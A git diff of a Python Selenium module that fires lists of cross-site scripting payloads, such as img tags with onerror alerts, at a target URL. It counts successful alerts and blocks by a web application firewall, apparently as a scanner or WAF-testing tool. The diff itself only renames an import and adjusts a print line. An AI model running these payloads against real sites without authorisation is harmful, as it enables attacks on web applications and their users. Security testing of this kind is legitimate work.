@@ -3,7 +3,7 @@ from selenium.webdriver.support import expected_conditions as EC
 from selenium.webdriver.support.ui import WebDriverWait
 from selenium.common.exceptions import TimeoutException, ElementClickInterceptedException
 from selenium.common.exceptions import NoSuchElementException
-import utility
+import Utility
 
 
 def execute(driver, target_url):
@@ -12,7 +12,7 @@ def execute(driver, target_url):
 
 
 def implement_attack(driver, target_url):
-    print(f"[+] Running Cross Site Scripting [XSS] Attacks \n")
+    print(f"\n[+] Running Cross Site Scripting [XSS] Attacks \n")
     xss_level_1 = [
         """<img src="" onerror="alert('XSS')">""",
         """<IMG SRC=# onerror="alert('XSS')">""",
@@ -66,11 +66,11 @@ def implement_attack(driver, target_url):
                 alert = driver.switch_to.alert
                 alert.accept()
                 success_counter += 1
-                utility.write_to_log('XSS', payload + '\n')
+                Utility.write_to_log('XSS', payload + '\n')
             except TimeoutException:
                 # look for any element with id="xss", click it and check for 'alert' box
                 try:
-                    if utility.check_if_element_exists(driver, "id", "xss"):
+                    if Utility.check_if_element_exists(driver, "id", "xss"):
                         el = driver.find_element_by_id("xss")
                         #ActionChains(driver).move_to_element(el).perform()
                         el.click()
@@ -78,10 +78,10 @@ def implement_attack(driver, target_url):
                         alert = driver.switch_to.alert
                         alert.accept()
                         success_counter += 1
-                        utility.write_to_log('XSS', payload + '\n')
+                        Utility.write_to_log('XSS', payload + '\n')
 
                     # Check if attack blocked by waf
-                    elif utility.check_if_element_exists(driver, "xpath", "/html/body/center/h1"):
+                    elif Utility.check_if_element_exists(driver, "xpath", "/html/body/center/h1"):
                         if "403 Forbidden" == driver.find_element_by_xpath("/html/body/center/h1").text:
                             blocked_by_waf_counter += 1
                 except NoSuchElementException:
